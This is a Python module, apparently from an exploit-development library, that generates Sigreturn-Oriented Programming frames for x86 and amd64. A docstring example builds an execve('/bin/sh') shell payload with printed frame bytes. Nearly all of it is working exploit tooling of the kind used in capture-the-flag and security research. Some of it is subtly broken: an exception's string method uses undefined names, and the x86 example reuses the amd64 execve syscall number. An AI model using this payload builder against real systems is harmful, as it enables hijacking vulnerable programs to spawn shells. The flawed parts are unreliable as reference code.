import struct

registers_32 = ["gs",   "fs",  "es",  "ds",   "edi",  "esi", "ebp", "esp", "ebx",
             "edx",  "ecx", "eax", "JUNK", "JUNK", "eip", "cs",  "eflags",
             "JUNK", "ss",  "floa"]

registers_64 = ["uc_flags", "&uc", "uc_stack.ss_sp", "uc_stack.ss_flags", "uc_stack.ss_size",
                "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15", "rdi", "rsi", "rbp",
                "rbx", "rdx", "rax", "rcx", "rsp", "rip", "eflags", "csgsfs", "err", "trapno",
                "oldmask", "cr2", "&fpstate", "__reserved", "sigmask"]

reg_pos_mapping_x86 = {}
for pos, reg in enumerate(registers_32):
    reg_pos_mapping_x86[reg] = pos

reg_pos_mapping_x64 = {}
for pos, reg in enumerate(registers_64):
    reg_pos_mapping_x64[reg] = pos



class ValueException(Exception):
    def __init__(self, register, value):
        self.value = value
    def __str__(self):
        return "Register: %s Value: %d" %(register, value)

class SigreturnFrame(object):
    """
    A Sigreturn-Oriented Payload
    Generator for x86-x64 and x86
    

    Example:
          Python 3.8.2 (default, Apr 27 2020, 15:53:34) 
          [GCC 9.3.0] on linux
          Type "help", "copyright", "credits" or "license" for more information
          >>> from roppy import *
          >>> syscall = 0x000000000040101b
          >>> pop_rax = 0x0000000000401020
          >>> bin_sh = 0x0000000000402000
          >>> frame = SigreturnFrame(arch="amd64")
          >>> frame.set_regvalue("rdi", bin_sh)
          >>> frame.set_regvalue("rax", 59)
          >>> frame.set_regvalue("rip", syscall)
          >>> frame.get_frame()
          b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 @\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x10@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
          >>> # x86 SROP frame build
          >>> frame = SigreturnFrame(arch="x86")
          >>> frame.set_regvalue("edi", bin_sh)
          >>> frame.set_regvalue("eax", 59)
          >>> frame.set_regvalue("eip", syscall)
          >>> frame.get_frame()
          b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 @\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x10@\x00s\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00{\x00\x00\x00\x00\x00\x00\x00'

    """
    def __init__(self, arch="x86"):
        self.arch  = arch
        self.frame = []
        self.initialize_vals()

    def initialize_vals(self):
        if self.arch == "x86":
            self._initialize_x86()
        elif self.arch == "amd64":
            self._initialize_x64()

    def _initialize_x64(self):
        for i in range(len(registers_64)):
            self.frame.append(struct.pack("<Q", 0x0))
        self.set_regvalue("csgsfs", 0x33)
        self.set_regvalue("&fpstate", 0x0)
        self.set_regvalue("__reserved", 0x0)

    def _set_regvalue_x64(self, reg, val):
        index = reg_pos_mapping_x64[reg]
        value = struct.pack("<Q", val)
        self.frame[index] = value

    def _initialize_x86(self):
        for i in range(len(registers_32)):
            self.frame.append(struct.pack("<I", 0x0))
        self.set_regvalue("cs", 0x73)
        self.set_regvalue("ss", 0x7b)

    def set_regvalue(self, reg, val):
        if self.arch == "x86":
            self._set_regvalue_x86(reg, val)
        elif self.arch == "amd64":
            self._set_regvalue_x64(reg, val)

    def _set_regvalue_x86(self, reg, val):
        index = reg_pos_mapping_x86[reg]
        value = struct.pack("<I", val)
        if reg == "ss":
            value = struct.pack("<h", val) + b"\x00\x00"
        self.frame[index] = value

    def get_frame(self):
        """ Returns frame """
        frame_contents = b''.join(self.frame)
        if self.arch == "x86":
            assert len(frame_contents) == len(registers_32) * 4
        elif self.arch == "amd64":
            assert len(frame_contents) == len(registers_64) * 8
        return frame_contents
